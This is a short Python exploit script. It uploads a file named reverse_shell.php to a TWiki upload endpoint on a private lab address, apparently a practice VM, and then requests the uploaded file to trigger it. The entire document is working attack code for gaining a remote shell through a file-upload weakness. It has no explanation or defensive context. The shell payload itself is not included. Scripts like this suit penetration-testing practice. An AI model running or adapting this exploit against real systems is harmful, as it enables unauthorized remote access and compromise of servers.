import requests

url = 'http://192.168.56.101:80/twiki/bin/upload/Main/WebHome'

data = {
    'createlink': 'on',
    'filecomment': 'This is a test file'
}

with open('reverse_shell.php', 'rb') as file_to_upload:
    files = {
        'filepath': ('reverse_shell.php', file_to_upload, 'text/plain')
    }
    response = requests.post(url, files=files, data=data)


if response.status_code == 200:
    print("File uploaded successfully")

    res = requests.get("http://192.168.56.101/twiki/pub/Main/WebHome/reverse_shell.php.txt", timeout=3)

else:
    print(f"Failed to upload file. Status code: {response.status_code}")
    print(response.text)
